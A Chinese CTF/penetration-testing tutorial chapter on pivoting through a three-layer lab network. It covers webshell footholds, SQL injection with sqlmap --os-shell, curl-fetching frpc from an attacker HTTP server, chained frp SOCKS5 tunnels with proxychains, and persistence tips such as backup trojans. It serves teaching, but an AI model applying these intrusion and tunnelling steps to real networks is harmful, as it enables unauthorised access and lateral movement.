---
comments: true
---

# 三层网络实战

本章是「两层网络实战」的进阶实操。两层网络的思路是：拿下一台边界机器，挂一层代理，打进内网。而真实的靶场（以及稍微大一点的 CTF AWD/渗透综合题）往往不止一层：边界机器后面还有 DMZ 区，DMZ 后面才是真正的核心内网。本章带你把"打点 → 立足 → 代理 → 再打下一层"这个循环完整跑三遍，重点讲清楚 **多层代理链怎么配、链路断了怎么排查**。

> 前置知识：建议先掌握 [文件上传](./file_upload.md)、[RCE](./rce.md)、[SQL注入](./sql_injection.md) 等打点手法，以及两层网络实战中的单层代理概念。

## 网络拓扑

本章使用的靶场拓扑如下，共四台机器、三张网卡段：

```
攻击机 (Kali)          边界服务器           DMZ 服务器            核心内网
192.168.1.10   ──▶   Web1               ──▶   Web2             ──▶   DC / DB
                   外网: 192.168.1.20        DMZ: 10.10.10.20        核心: 172.16.5.10
                   内网: 10.10.10.10         内网: 172.16.5.20
```

各层角色：

- **边界服务器 Web1**：对公网开放 Web 服务（80 端口），是唯一的入口。双网卡，能访问 DMZ。
- **DMZ 服务器 Web2**：只对 DMZ 网段开放服务，攻击机无法直接访问。双网卡，能访问核心内网。
- **核心内网目标**：存放 flag 的机器（如域控、数据库），只有 Web2 能触达。
- **攻击机**：只能直接连通 Web1 的外网口，其余全靠代理链。

核心原则一句话：**每一层立足后，都把当前机器变成跳板，让攻击机的流量"接力"到下一层**。接力工具可以是 frp、proxychains、ssh、ew 等，本章主线用 frp + proxychains，因为它们在 CTF 中最常见。

## 完整链路总览

整条链路的节奏是同一个循环的三次迭代：

1. **打点**：利用 Web 漏洞（文件上传、SQL 注入、RCE 等）拿到当前层 Web 服务的 shell。
2. **立足**：上传并运行代理服务端（如 frps/frpc），在攻击机上建立回连通道。
3. **代理**：把通道挂到 proxychains 上，让攻击机的工具流量从当前跳板"穿"出去，探测并攻击下一层。

下面逐层展开。

## 第一层：边界打点与立足

### 打点

Web1 跑着一个小型 CMS。通过目录扫描发现后台 `/admin`，弱口令 `admin/admin` 登录后存在模板编辑功能——经典的一句话木马写入场景（手法详见 [文件上传](./file_upload.md) 与 [RCE](./rce.md) 章节）。

写入 `shell.php` 后，用蚁剑或直接命令执行验证：

```bash
curl "http://192.168.1.20/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

拿到 www-data 权限的 WebShell，第一层打点完成。

### 立足：建立第一层代理

思路：攻击机（公网可达）上跑 **frps**（服务端），Web1 上跑 **frpc**（客户端）主动回连。这样即使 Web1 在 NAT 后面也没关系——只要能出网即可。

攻击机 `frps.ini`：

```ini
[common]
bind_port = 7000
```

Web1 侧 `frpc.ini`（先探测出网端口是否被封，7000 不通就换 80/443/53 这类常见放行端口）：

```ini
[common]
server_addr = 192.168.1.10
server_port = 7000

[socks5_web1]
type = tcp
remote_port = 1080
plugin = socks5
```

这个配置的含义：frpc 连上 frps 后，在 **攻击机的 1080 端口** 上开一个 SOCKS5 服务，所有流量经由 Web1 转发。启动：

```bash
# 攻击机
./frps -c frps.ini &
# Web1（WebShell 里执行，注意 nohup 防挂断）
nohup ./frpc -c frpc.ini &
```

上传 frpc 的技巧：WebShell 通常不方便传大文件，可以用 `curl`/`wget` 从攻击机起的临时 HTTP 服务下载：

```bash
# 攻击机
python3 -m http.server 8000
# Web1
curl -o /tmp/frpc http://192.168.1.10:8000/frpc && chmod +x /tmp/frpc
```

### 挂到 proxychains

攻击机编辑 `/etc/proxychains4.conf`（末尾改为）：

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

验证第一层代理生效——从攻击机直接扫 Web1 的内网侧才能看到的 DMZ 主机：

```bash
proxychains4 -q nmap -sT -Pn -p 80,22,3306 10.10.10.20
```

注意两点：`proxychains` 下 nmap 只能用 `-sT`（全连接扫描），SYN 扫描走不了代理；`-Pn` 跳过主机发现，避免被代理环境的 ICMP 行为误导。

至此第一层立足完成：攻击机 → (SOCKS5) → Web1 → 可达 10.10.10.0/24。

## 第二层：DMZ 打点与立足

### 打点

透过第一层代理访问 Web2：

```bash
proxychains4 -q curl http://10.10.10.20/
```

发现是一个存在 SQL 注入的站点（注入手法见 [SQL注入](./sql_injection.md) 章节），通过 `INTO OUTFILE` 或注入点后台拿 WebShell，思路与第一层完全相同。也可以用 `proxychains4 -q sqlmap -u "http://10.10.10.20/item.php?id=1" --os-shell` 直接打通。

### 立足：第二层代理（frp 串联写法）

现在的关键问题来了：Web2 **不出公网**，它只能访问 DMZ 网段和核心网段。所以第二层 frpc 不能回连攻击机，只能 **回连到 Web1**。

这就需要把 frps 也"下沉"一层。推荐的分层架构：

- 攻击机跑 `frps`（第一层服务端，端口 7000）
- Web1 跑 `frpc`（回连攻击机）**+ 再跑一个 `frps`**（第二层服务端，端口 7001）
- Web2 跑 `frpc`，回连 Web1 的 7001 端口

Web1 上的第二个配置文件 `frps2.ini`：

```ini
[common]
bind_addr = 10.10.10.10
bind_port = 7001
```

Web2 上的 `frpc.ini`：

```ini
[common]
server_addr = 10.10.10.10
server_port = 7001

[socks5_web2]
type = tcp
remote_port = 1081
plugin = socks5
```

问题来了：`socks5_web2` 这个插件开在 **Web1 的 1081 端口** 上，攻击机够不到 Web1 的内网口怎么办？答案：利用第一层的 frp 把 Web1 的 1081 端口"搬"回攻击机。在 Web1 的 `frpc.ini`（回连攻击机那个）里追加一条转发：

```ini
[forward_web2_socks]
type = tcp
local_ip = 10.10.10.10
local_port = 1081
remote_port = 1081
```

最终效果：攻击机 `127.0.0.1:1081` →（第一层 frp 隧道）→ Web1 `10.10.10.10:1081` →（第二层 frp 隧道）→ Web2 出口。这就是 **多层 frp 的核心套路：每一层只管回连上一层，端口用上一层的隧道逐层回传**。

### 代理链串联

攻击机现在的 proxychains 配置写成链式：

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

proxychains 会按顺序串联：流量先经 1080 到 Web1，再经 1081 到 Web2 出去。注意 `1081` 这条在 Web1 上本来就能直连（frp 隧道已在第一层跑通），所以链路成立。

验证链路已抵达核心内网：

```bash
proxychains4 -q nmap -sT -Pn -p 445,3389,3306 172.16.5.10
```

如果配 `strict_chain`（默认）链路中任意一环断开整条即失败，调试时可以临时用 `dynamic_chain` 跳过坏节点定位问题。

## 第三层：核心内网目标

链路打通后，最后一层就是常规内网渗透：

```bash
# 探测目标服务
proxychains4 -q nmap -sT -Pn -p 1-1000 172.16.5.10
# 访问目标的 Web 后台
proxychains4 -q curl http://172.16.5.10:8080/
# 需要交互式 shell 时挂代理连 ssh / rdesktop
proxychains4 -q ssh admin@172.16.5.10
```

拿到 flag，收工。整链回顾：**攻击机 → frps → Web1（frpc + frps）→ Web2（frpc）→ 目标**。每层的角色都不复杂，复杂的是"端口在哪台机器上、谁连谁"——建议动手前在纸上画一遍隧道走向。

## 常见坑与排查思路

### 1. 端口不通：frpc 连不上 frps

现象：frpc 日志报 `connect to server error: dial tcp ... connect: connection refused` 或超时。

排查顺序：

```bash
# 在客户端所在机器上测连通性
curl -v telnet://<server_addr>:<server_port>
# 或
nc -zv <server_addr> <server_port>
```

- **connection refused**：服务端没监听或监听地址不对。检查 `bind_addr`——多层场景里 Web1 的第二个 frps 必须绑定 `10.10.10.10`（或 `0.0.0.0`），绑了 `127.0.0.1` 或公网口，Web2 就连不上。
- **超时（timeout）**：中间有防火墙/安全组拦了该端口。换端口是首选解法：出网方向优先试 `443`、`80`、`53`，横向方向看靶场拓扑放行哪些。
- WebShell 场景下别忘了确认进程还活着：`ps aux | grep frpc`，很多 WebShell 环境命令执行完子进程会被杀，用 `nohup ... &` 或 `setsid` 兜底。

### 2. 协议被拦：能连上但流量过不了

现象：TCP 端口能通，但代理里的 HTTP/扫描流量没有响应。

- 有些环境只放行特定协议（比如只允许 HTTP 出网）。这时 SOCKS5 裸流量会被 DPI 掐掉，可给 frp 加伪装：`tls_enable = true`，或改用走 HTTP 隧道的工具。
- proxychains 不支持 UDP/ICMP：`ping`、`nmap -sS`、DNS 解析默认都走不了代理。表现为"nmap 扫不出任何端口"——多半不是目标没开端口，而是你的扫描方式走不了代理。牢记：`nmap` 加 `-sT -Pn`；需要解析域名时用 `proxychains4 -q dig @<内网DNS> ...` 之类走 TCP 的方式，或在 proxychains 配置里启用 `proxy_dns`。
- 部分工具自带代理参数（如 `curl --socks5`、`sqlmap --proxy`），单跳场景用工具自带的往往比 proxychains 稳定。

### 3. 链路断：代理链某一环失效

现象：昨天还能扫通 `172.16.5.10`，今天 proxychains 报超时。

分段定位法——从近到远逐环验证：

```bash
# 第一环：攻击机到 Web1
proxychains4 -q -f <(printf '[ProxyList]\nsocks5 127.0.0.1 1080\n') curl http://10.10.10.20/
# 第二环：完整链到 Web2 出口
proxychains4 -q curl http://172.16.5.10:8080/
```

- 第一环通、整链不通 → 问题在 Web1 的第二个 frps 或 Web2 的 frpc，登回 Web1 的 WebShell 查进程和日志：`frps2` 是否还在、`netstat -tlnp | grep 7001` 是否在监听。
- WebShell 掉了 → 回到打点环节重新拿 shell，这也是为什么要尽早做权限维持（写计划任务、放备用木马）。
- 临时调试把 proxychains 的 `strict_chain` 改成 `dynamic_chain`，它会自动跳过断掉的环节，能帮你快速确认"是哪一环断了"。

### 4. 其他高频小坑

- **frpc/frps 版本不一致**：frp 跨大版本协议不兼容，客户端服务端用同一版本的二进制。
- **架构不对**：目标机是 x64 还是 arm，先 `uname -m` 再传对应的 frpc。
- **remote_port 冲突**：一条 frps 上两个代理抢同一个 `remote_port` 会导致后启动的失败，日志里报 `port already used`。
- **忘记加 `-q`**：proxychains 默认输出大量日志混进工具输出，脚本化处理结果时会解析错乱。

## 小结

三层网络的本质就是把"打点 → 立足 → 挂代理"这个循环做三遍，难点全部集中在 **代理链的配置与维护** 上。记住三个要点：

1. 每层客户端只回连 **上一层** 的服务端，端口通过已有隧道逐层回传到攻击机。
2. proxychains 用链式配置把多层 SOCKS5 串起来，工具侧坚持 `-sT -Pn` 这类代理友好用法。
3. 出问题按"分段验证、由近及远"的顺序排查：先查进程是否存活，再查端口是否监听，最后查防火墙是否放行。
